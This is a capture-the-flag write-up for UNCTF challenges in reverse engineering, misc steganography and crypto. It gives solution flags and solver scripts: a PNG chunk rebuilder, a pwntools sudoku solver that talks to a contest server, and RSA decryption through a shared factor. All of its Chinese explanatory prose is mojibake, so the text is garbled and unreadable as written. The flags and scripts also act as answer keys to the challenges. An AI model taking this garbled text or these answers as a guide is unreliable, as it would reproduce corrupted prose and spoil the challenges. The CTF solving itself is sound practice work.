src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>flagï¼šflag{2378b077-7d6e-4564-bdca-7eec8eede9a2}</p><h3 id="unctfeasyMaze"><a href="#unctfeasyMaze" class="headerlink" title="unctfeasyMaze"></a>unctfeasyMaze</h3><p>è§£æ³•ä¸€ï¼šidaåæ±‡ç¼–åç¨‹åºé€»è¾‘å°±æ˜¯å¯¹åœ°å›¾è¿›è¡Œäº†ä¸¤æ¬¡åˆå§‹åŒ–ï¼Œç„¶åå°±æ˜¯æ­£å¸¸èµ°è¿·å®«äº†</p><p>å°†æ–­ç‚¹è®¾ç½®åœ¨åœ°å›¾ç¬¬äºŒæ¬¡åˆå§‹åŒ–å®Œæˆåï¼Œç„¶åæŸ¥çœ‹RSIçš„å€¼</p><p><a href="https://p1.ssl.qhimg.com/t01737c26b1931378a3.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>7ä¸ªä¸€è¡Œæ’åˆ—</p><p><a href="https://p2.ssl.qhimg.com/t01e30cd9bab6cc1578.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>èµ°å®Œå³å¯å¾—åˆ°flag</p><p><a href="https://p4.ssl.qhimg.com/t01e559eb7eb446c594.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>flagï¼šUNCTF{ssddwdwdddssaasasaaassddddwdds}</p><p>è§£æ³•äºŒï¼šçˆ†ç ´</p><p>è¿è¡Œäº†ç¨‹åºåå‘ç°å¯ä»¥ä¸€æ­¥ä¸€æ­¥èµ°ï¼Œä¸€æ—¦èµ°é”™å°±ä¼šæŠ¥é”™</p><p>äºæ˜¯å¯ä»¥æŒ‰ä½çˆ†ç ´ï¼Œæœ€å¤šä¹Ÿå°±æ˜¯è¯•4*29æ¬¡ï¼Œå¾ˆå¿«çš„ã€‚ã€‚ã€‚ï¼ˆè‡³å°‘æ¯”miscé‚£ä¸ªèµ°è¿·å®«è¦å¿«ï¼‰</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="ä¿¡å·ä¸å¥½æˆ‘å…ˆèµ°äº†"><a href="#ä¿¡å·ä¸å¥½æˆ‘å…ˆèµ°äº†" class="headerlink" title="ä¿¡å·ä¸å¥½æˆ‘å…ˆèµ°äº†"></a>ä¿¡å·ä¸å¥½æˆ‘å…ˆèµ°äº†</h3><p>ä¸‹è½½å¾—åˆ°å›¾ç‰‡ï¼Œçœ‹äº†åå…­è¿›åˆ¶æ²¡æœ‰éšè—ä¸œè¥¿ï¼Œäºæ˜¯ç”¨ç¥å™¨Stegsolveè¯•ä¸€æ³¢LSB</p><p><a href="https://p3.ssl.qhimg.com/t018175cd593a8bf85d.png" target="_blank" rel="noopener"><img src="https://p3.ssl.qhimg.com/t018175cd593a8bf85d.png" alt="img"></a></p><p>æœç„¶æœ‰ä¸œè¥¿ï¼Œè—äº†ä¸€ä¸ªzipåŒ…ã€‚</p><p>ä¿å­˜ä¸‹æ¥è§£å‹ç¼©å¾—åˆ°ä¸€ä¸ªå¼ è·Ÿä¹‹å‰ä¸€æ ·çš„å›¾ç‰‡ã€‚</p><p>ç›²çŒœç›²æ°´å°ï¼Œå·¥å…·ä¸€æŠŠæ¢­ï¼Œå¾—åˆ°</p><p><a href="https://p1.ssl.qhimg.com/t012729ab73729c051f.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t012729ab73729c051f.png" alt="img"></a></p><p>flagï¼šunctf{9d0649505b702643}</p><h3 id="äº²çˆ±çš„"><a href="#äº²çˆ±çš„" class="headerlink" title="äº²çˆ±çš„"></a>äº²çˆ±çš„</h3><p>åŸä»¥ä¸ºæ˜¯mp3éšå†™ï¼Œç„¶è€Œæ²¡æœ‰å¯†ç ã€‚</p><p>çœ‹åå…­è¿›åˆ¶æ•°æ®å‘ç°æœ‰ä¸€ä¸ªzipåŒ…åœ¨åº•ä¸‹ï¼Œ</p><p>ç„¶åæ³¨é‡Šæœ‰æç¤º</p><p>æ ¹æ®æç¤ºï¼Œå’Œæ­Œåï¼Œåœ¨qqéŸ³ä¹ æµ·é˜”å¤©ç©º æç° çš„è¯„è®ºåŒºï¼Œåœ¨å¯¹åº”è¯„è®ºæ—¶é—´æ‰¾åˆ°å¯†ç ï¼šçœŸçš„ä¸Šå¤´</p><p>è§£å‹å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œçœ‹åå…­è¿›åˆ¶æ•°æ®ï¼Œåº•ä¸‹éšå†™äº†ä¸€ä¸ªwordæ–‡æ¡£ï¼Œ</p><p>wordæ‰“å¼€ï¼Œå‘ç°å³ä¸‹è§’æœ‰ç«¯å€ªï¼Œæ˜¯å›¾ç‰‡ä¸€è§’ï¼Œæ‹–å‡ºæ¥å¾—åˆ°flag</p><p>ï¼ˆæˆ–è€…ç›´æ¥æŠŠwordæ–‡æ¡£å½“zipæ‰“å¼€ï¼Œåœ¨wordæ–‡ä»¶å¤¹ä¸­çš„mediaæ–‡ä»¶å¤¹ä¸­ä¹Ÿæœ‰flag çš„å›¾ç‰‡ï¼‰</p><p><a href="https://p1.ssl.qhimg.com/t01b72be95beef42f94.png" target="_blank" rel="noopener"><img src="https://p1.ssl.qhimg.com/t01b72be95beef42f94.png" alt="img"></a></p><p>flagï¼šUNCTF{W3L0v3Unctf}</p><h3 id="å¿«ä¹æ¸¸æˆé¢˜"><a href="#å¿«ä¹æ¸¸æˆé¢˜" class="headerlink" title="å¿«ä¹æ¸¸æˆé¢˜"></a>å¿«ä¹æ¸¸æˆé¢˜</h3><p>ç»ˆäºå‡ºç°äº†ç­¾åˆ°é¢˜ï¼Œç©æ¸¸æˆå¾—flag</p><p><a href="https://p2.ssl.qhimg.com/t0169f0bdcad13d39a6.png" target="_blank" rel="noopener"><img src="https://p2.ssl.qhimg.com/t0169f0bdcad13d39a6.png" alt="img"></a></p><p>flagï¼šUNCTF{c783910550de39816d1de0f103b0ae32}</p><h3 id="Happy-Puzzle"><a href="#Happy-Puzzle" class="headerlink" title="Happy Puzzle"></a>Happy Puzzle</h3><p>æ‰‹æ’•PNGå‘—ï¼Œæç¤ºé‡Œçš„RGBæ²¡ç®¡ï¼Œ400*400æ¯”è¾ƒæœ‰ç”¨ï¼Œ</p><p>æœ€åŸºæœ¬çš„PNGç»„æˆï¼šæ–‡ä»¶å¤´ï¼ŒIHDRï¼ŒIDATï¼ˆlen(data)+â€™IDATâ€™+data+crcï¼‰ï¼ŒIENDï¼Œå’Œéšå¤„å¯è§çš„crc32æ ¡éªŒï¼ˆè¿™ç©æ„å„¿å‘æƒ¨æˆ‘äº†ï¼‰</p><p>ç”¨windowsæ¯”è¾ƒæ–¹ä¾¿çš„æ˜¯ï¼Œcrcä¸ç”¨ç®—ï¼Œç”¨0å ä½å³å¯ï¼ŒIENDä¹Ÿå¯ä»¥ä¸ç”¨åŠ </p><p>è§£é¢˜è¿‡ç¨‹ï¼š</p><ol><li>éšä¾¿æ‰¾ä¸ªPNGï¼Œæ‹¿åˆ°pngæ–‡ä»¶å¤´+IHDRçš„æ•°æ®</li><li>æ”¹å®½é«˜</li><li>ç»™æ‰€æœ‰dataæ–‡ä»¶ï¼Œå‰é¢æ¥ä¸Šlen(data)ï¼Œå³00002800ï¼ŒIDATï¼Œå†ç»™æœ«å°¾åŠ ä¸Š00000000å crc32çš„ä½</li><li>åšå‡º26å¼ å›¾ï¼Œçœ‹å“ªå¼ å›¾æœ‰å›¾åƒï¼Œç„¶åä»¥æ­¤ç±»æ¨çš„å†å¾€ååŠ data</li></ol><ul><li>ç»“æœï¼š</li></ul><p><a href="https://p1.ssl.qhimg.com/t01ebe3f81bfa8ebd96.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>è´´ä¸ŠåŠè‡ªåŠ¨expï¼š</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import <span class="built_in">os</span></span><br><span class="line">head=<span class="string">'89504e470d0a1a0a0000000d494844520000019000000190080200000000000000'</span></span><br><span class="line">idata=<span class="string">'0000280049444154'</span></span><br><span class="line">crc=<span class="string">"1bad748e"</span></span><br><span class="line">with <span class="built_in">open</span>(filename,<span class="string">"rb"</span>) as f:</span><br><span class="line">       data = f.<span class="built_in">read</span>().encode(<span class="string">"hex"</span>)</span><br><span class="line">rootdir = <span class="string">''</span></span><br><span class="line">list = <span class="built_in">os</span>.listdir(rootdir) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="built_in">len</span>(list)):</span><br><span class="line">       <span class="built_in">path</span> = <span class="built_in">os</span>.<span class="built_in">path</span>.join(rootdir,list[i])</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">os</span>.<span class="built_in">path</span>.isfile(<span class="built_in">path</span>) <span class="keyword">and</span> <span class="built_in">path</span>[<span class="number">-5</span>:]==<span class="string">'.data'</span>:</span><br><span class="line">              with <span class="built_in">open</span>(<span class="built_in">path</span>,<span class="string">"rb"</span>) as f:</span><br><span class="line">                     txt = f.<span class="built_in">read</span>()</span><br><span class="line">                     txt=data+idata+txt.encode(<span class="string">"hex"</span>)+crc</span><br><span class="line">              with <span class="built_in">open</span>(<span class="built_in">path</span>.replace(<span class="string">"puzzle"</span>,<span class="string">"puzzle2"</span>).replace(<span class="string">"data"</span>,<span class="string">"png"</span>),<span class="string">"wb"</span>) as f:</span><br><span class="line">                     f.<span class="built_in">write</span>(txt.decode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure><p>flagï¼šucntf{312bbd92c1b291e1827ba519326b6688}</p><h3 id="think"><a href="#think" class="headerlink" title="think"></a>think</h3><p>ç”¨pythonçš„åŒ¿åå‡½æ•°ä¸€å¥è¯åˆ¶ä½œå‡ºçš„é¢˜ç›®</p><p><a href="https://p4.ssl.qhimg.com/t01005759a8be9dcc16.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t01005759a8be9dcc16.png" alt="img"></a></p><p>å…³é”®åœ¨è¿™é‡Œï¼Œcheckå‡½æ•°åˆ¤æ–­checknumï¼Œå¦‚æœchecknumä¸º1ï¼Œå°±æ‰“å°(<strong>print(â€˜Congratulation!â€™), (</strong>print(decrypt(key, encrypted)),çŒœæµ‹åé¢åŠéƒ¨åˆ†å°±æ˜¯flag</p><p>äºæ˜¯ï¼Œç›´æ¥è¿è¡Œä»£ç ï¼Œç„¶ååœ¨IDLEé‡Œé”®å…¥check(1)ï¼Œå¾—åˆ°flag</p><p><a href="https://p5.ssl.qhimg.com/t0115f99ae8df9d03eb.png" target="_blank" rel="noopener"><img src="https://p5.ssl.qhimg.com/t0115f99ae8df9d03eb.png" alt="img"></a></p><p>flag:flag{34a94868a8ad9ff82baadb326c513d40}</p><h3 id="Hidden-secret"><a href="#Hidden-secret" class="headerlink" title="Hidden secret"></a>Hidden secret</h3><p>ä¸‹è½½æ‹¿åˆ°ä¸‰ä¸ªé‡Œé¢å…¨æ˜¯åå…­è¿›åˆ¶çš„æ–‡ä»¶</p><p>çœ‹åˆ°03 04 05 06 01 02</p><p>å°±æ„è¯†åˆ°è¿™ä¸‰ä¸ªæ˜¯è¢«å»æ‰äº†50 4Bçš„zipåŒ…çš„ä¸‰æ®µæ•°æ®</p><p>ç”¨010editoræ‹¼æ¥èµ·æ¥åå¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢æ˜¯ä¸€ä¸ªå›¾ç‰‡</p><p>ç”¨010editoræ‰“å¼€å›¾ç‰‡ååº•ä¸‹è—äº†ä¸€ä¸ªzipåŒ…</p><p>è§£å‹å¾—åˆ°ä¸€ä¸²å¯†æ–‡ï¼šâ€K&lt;jslc7b5â€™gBA&amp;]_5MF!h5+E.@IQ&amp;A%EExEzp\X#9YhiSHV#â€</p><p>baseå…¨å®¶æ¡¶èµ°ä¸€éï¼Œæœ€åç¡®å®šæ˜¯base92</p><p><a href="https://p2.ssl.qhimg.com/t0183d046de0ef60b68.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>å¾—åˆ°flagï¼šunctf{cca1a567c3145b1801a4f3273342c622}</p><h3 id="EasyBox"><a href="#EasyBox" class="headerlink" title="EasyBox"></a>EasyBox</h3><p>ncè¿ä¸Šåæ˜¯ä¸ªæ•°ç‹¬é¢˜ï¼Œä¸è¿‡æ˜¯éå¸¸è§„çš„ï¼Œåªéœ€è¦è¡Œå’Œåˆ—ä¸é‡å¤å³å¯</p><p>é­”æ”¹äº†ä¸ªå¤§ä½¬çš„è„šæœ¬ï¼š<a href="https://blog.csdn.net/zonnin/article/details/78813698" target="_blank" rel="noopener">https://blog.csdn.net/zonnin/article/details/78813698</a></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">from pwn import *</span><br><span class="line"><span class="built_in">context</span>.log_level='debug'</span><br><span class="line">sh = remote('<span class="number">101.71</span>.29.5',<span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">content</span> = sh.recvuntil(<span class="string">"answer :\n"</span>)[<span class="number">339</span>:<span class="number">718</span>].replace(<span class="string">"\n"</span>,<span class="string">""</span>).<span class="built_in">split</span>(<span class="string">"+-+-+-+-+-+-+-+-+-+"</span>)</span><br><span class="line">sudoku=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">content</span>:</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="string">""</span>:</span><br><span class="line">        sudoku.<span class="built_in">append</span>(i.replace(<span class="string">" "</span>,<span class="string">"0"</span>)[<span class="number">1</span>:-<span class="number">1</span>].<span class="built_in">split</span>(<span class="string">"|"</span>))</span><br><span class="line">#<span class="built_in">print</span> sudoku</span><br><span class="line"></span><br><span class="line">def find_index(s):</span><br><span class="line">    flag=list()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="built_in">row</span>=[]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> s[i][j]=='<span class="number">0</span>':</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(<span class="number">0</span>)</span><br><span class="line">        flag.<span class="built_in">append</span>(<span class="built_in">row</span>)</span><br><span class="line">    <span class="built_in">return</span> flag</span><br><span class="line">                </span><br><span class="line">                </span><br><span class="line">def not_done(s):</span><br><span class="line">    <span class="built_in">return</span> True <span class="keyword">in</span> [<span class="number">0</span> <span class="keyword">in</span> r <span class="keyword">for</span> r <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line">def get_row(s, r):</span><br><span class="line">    <span class="built_in">return</span> s[r]</span><br><span class="line"></span><br><span class="line">def get_column(s, c):</span><br><span class="line">    <span class="built_in">return</span> [r[c] <span class="keyword">for</span> r <span class="keyword">in</span> s]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_possible(s, r, c):</span><br><span class="line">    <span class="built_in">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>) \</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> get_row(s, r) \</span><br><span class="line">                <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> get_column(s, c)]</span><br><span class="line"></span><br><span class="line">def go_around(s):</span><br><span class="line">    ans = []</span><br><span class="line">    <span class="keyword">for</span> index_r, r <span class="keyword">in</span> enumerate(s): #row_index <span class="keyword">and</span> <span class="built_in">row</span></span><br><span class="line">        <span class="built_in">row</span> = []</span><br><span class="line">        <span class="keyword">for</span> index_c, c <span class="keyword">in</span> enumerate(r): #each <span class="keyword">in</span> <span class="built_in">row</span></span><br><span class="line">            c=int(c)</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> == c:</span><br><span class="line">                maybe_ans = get_possible(s, index_r, index_c)</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(maybe_ans[<span class="number">0</span>] <span class="keyword">if</span> len(maybe_ans) == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">row</span>.<span class="built_in">append</span>(c)</span><br><span class="line">        ans.<span class="built_in">append</span>(<span class="built_in">row</span>)</span><br><span class="line">    <span class="built_in">return</span> ans</span><br><span class="line"></span><br><span class="line">def print_sudoku(s, msg):</span><br><span class="line">    <span class="built_in">print</span> msg</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> s:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">" "</span>.<span class="built_in">join</span>([str(c) <span class="keyword">for</span> c <span class="keyword">in</span> r])</span><br><span class="line">    <span class="built_in">print</span> <span class="string">"*"</span>*<span class="number">18</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#print_sudoku(sudoku, <span class="string">"initializing..."</span>)</span><br><span class="line">FLAG=find_index(sudoku)</span><br><span class="line">counter=<span class="number">0</span></span><br><span class="line">sudoku = go_around(sudoku)</span><br><span class="line">#print_sudoku(sudoku, <span class="string">"Round "</span>+ str(counter) + <span class="string">" :"</span>)</span><br><span class="line">#counter += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> not_done(sudoku):</span><br><span class="line">    sudoku = go_around(sudoku)</span><br><span class="line">    #print_sudoku(sudoku, <span class="string">"Round "</span>+ str(counter) + <span class="string">" :"</span>)</span><br><span class="line">   # counter += <span class="number">1</span></span><br><span class="line">answer=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">if</span> FLAG[<span class="number">0</span>][i] == <span class="number">1</span>:</span><br><span class="line">        answer+=str(sudoku[<span class="number">0</span>][i])+<span class="string">","</span></span><br><span class="line">answer=answer[:-<span class="number">1</span>]</span><br><span class="line">sh.sendline(answer)</span><br><span class="line">#<span class="built_in">print</span> answer</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    answer=<span class="string">""</span></span><br><span class="line">    sh.recvuntil(<span class="string">"answer :"</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> FLAG[i][j]==<span class="number">1</span>:</span><br><span class="line">           answer+=str(sudoku[i][j])+<span class="string">","</span></span><br><span class="line">    answer=answer[:-<span class="number">1</span>]</span><br><span class="line">    sh.sendline(answer)</span><br><span class="line">    #<span class="built_in">print</span> answer</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://p0.ssl.qhimg.com/t01085b7d87603dfcf5.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>å¾—åˆ°flagï¼šflag{b613e841e0822e2925376d5373cbfbc4}</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="ä¸ä»…ä»…æ˜¯RSA"><a href="#ä¸ä»…ä»…æ˜¯RSA" class="headerlink" title="ä¸ä»…ä»…æ˜¯RSA"></a>ä¸ä»…ä»…æ˜¯RSA</h3><p>ä¸‹è½½é™„ä»¶å¾—åˆ°äº”ä¸ªæ–‡ä»¶ï¼Œ</p><p>ä¸¤ä¸ªéŸ³é¢‘æ–‡ä»¶ï¼Œçœ‹æ³¢å½¢å›¾ï¼Œæ˜¯æ‘©æ–¯å¯†ç ï¼Œè§£å¯†å¾—åˆ°c1,c2</p><p>ä¸¤ä¸ªpemæ–‡ä»¶ï¼Œç”¨opensshæ‰“å¼€å¾—åˆ°ä¸¤ä¸ªæ¨¡nå’Œç›¸åŒçš„e</p><p>æ ¹æ®åŠ å¯†è„šæœ¬å¾—çŸ¥ä¸¤ä¸ªnæœ‰å…¬çº¦æ•°</p><p>æ‰€ä»¥å·²çŸ¥e p q</p><p>åŸºç¡€rsaè§£å¯†ï¼Œ</p><p>expï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">def GCD(a, b):</span><br><span class="line"></span><br><span class="line">    while b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c1=4314251881242803343641258350847424240197348270934376293792054938860756265727535163218661012756264314717591117355736219880127534927494986120542485721347351</span><br><span class="line">c2=485162209351525800948941613977942416744737316759516157292410960531475083863663017229882430859161458909478412418639172249660818299099618143918080867132349</span><br><span class="line"></span><br><span class="line">e=mpz(41221)</span><br><span class="line"></span><br><span class="line">n1=int('0xC461B3ED566F2D68583019170BDD5263D113BAECE3DEE6631F08A166376AC41FF5D4E90B3330E0FC26993E3B353F38F9B6B880DFBC5807636497561B7611047B',16)</span><br><span class="line"></span><br><span class="line">n2=int('0xA36E3A2A83FE2C1E33F285A08C3ECD36E377F4D9FFE828E2426D3ECED0A7F947631E932AEC327555511AC6D71E72686C1CB7DBBF3859A4D9A3D344FBF12A9553',16)</span><br><span class="line"></span><br><span class="line"><span class="comment">#q=GCD(n1,n2)</span></span><br><span class="line">q = mpz(95652716952085928904432251307911783641637100214166105912784767390061832540987)</span><br><span class="line">print n2/q</span><br><span class="line">p1 = mpz(107527961531806336468215094056447603422487078704170855072884726273308088647617)</span><br><span class="line">p2 = mpz(89485735722023752007114986095340626130070550475022132484632643785292683293897)</span><br><span class="line">assert p1*q==n1</span><br><span class="line">assert p2*q==n2</span><br><span class="line">d1 = invert(e,(p1-1)*(q-1))</span><br><span class="line">d2 = invert(e,(p2-1)*(q-1))</span><br><span class="line"></span><br><span class="line">m1 = hex(pow(c1,d1,n1))[2:].decode('hex')</span><br><span class="line">m2 = hex(pow(c2,d2,n2))[2:].decode('hex')</span><br><span class="line">print m1,m2</span><br></pre></td></tr></table></figure><p>flagï¼šUNCTF{ac01dff95336aa470e3b55d3fe43e9f6}</p><h3 id="ä¸€å¥è¯åŠ å¯†"><a href="#ä¸€å¥è¯åŠ å¯†" class="headerlink" title="ä¸€å¥è¯åŠ å¯†"></a>ä¸€å¥è¯åŠ å¯†</h3><p>æ‹¿åˆ°æ–‡ä»¶ï¼Œpythonæ–‡ä»¶é‡Œæ²¡æœ‰å•¥ï¼Œæ­£å¸¸çš„rsaåŠ å¯†ï¼Œ</p><p>ç„¶åç”¨010editoræ‰“å¼€å¦å¤–ä¸€å¼ å›¾ç‰‡ï¼Œå‘ç°åº•ä¸‹æœ‰å†…å®¹</p><p><a href="https://p4.ssl.qhimg.com/t016ad124e2ec4f7898.png" target="_blank" rel="noopener"><img src="https://p4.ssl.qhimg.com/t016ad124e2ec4f7898.png" alt="img"></a></p><p>çŒœæµ‹é‚£ä¸ªå¤§æ•°æ˜¯nï¼Œå…ˆæ‹¿å»åˆ†è§£ä¸€æ³¢ï¼Œå‘ç°å¯è¡Œ</p><p><a href="https://p0.ssl.qhimg.com/t01ecb1e951aebdcb5a.png" target="_blank" rel="noopener"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="img"></a></p><p>ä½†æ˜¯ï¼Œeå‘¢ï¼Ÿ</p><p>çªç„¶ï¼Œå‘ç°è¢«åˆ†è§£å‡ºæ¥çš„på’Œqå¾ˆç†Ÿæ‚‰</p><p>ä¸Š<a href="https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">Vçˆ·çˆ·åšå®¢</a>!</p><p>pã€qå‡ºç°åœ¨Vçˆ·çˆ·çš„Rabinå¯†ç çš„è„šæœ¬é‡Œï¼Œé‚£ä¹ˆè¿™é¢˜å°±æ˜¯Rabinå¯†ç 